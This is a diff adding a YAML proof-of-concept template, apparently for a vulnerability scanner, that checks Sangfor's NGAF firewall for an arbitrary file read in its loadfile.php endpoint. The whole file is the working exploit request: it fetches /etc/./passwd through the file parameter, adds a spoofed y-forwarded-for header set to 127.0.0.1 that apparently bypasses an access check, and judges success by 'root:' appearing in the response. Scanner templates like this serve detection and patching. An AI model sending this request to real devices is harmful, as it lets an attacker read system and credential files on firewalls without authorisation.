@@ -1,0 +1,16 @@
+id: poc-yaml-sangfor-ngaf-file-read
+info:
+  name: 深信服-下一代防火墙-loadfile-任意文件读取
+  severity: high
+  tags:
+  - 文件读取
+  finger: 下一代防火墙NGAF
+requests:
+- method: GET
+  path: /svpn_html/loadfile.php?file=/etc/./passwd
+  headers:
+    y-forwarded-for: 127.0.0.1
+  expression: status_code == 200 && contains(body, "root:") && contains(body, "/bin")
+    && !contains(body, "<")
+variables: {}
+transport: http
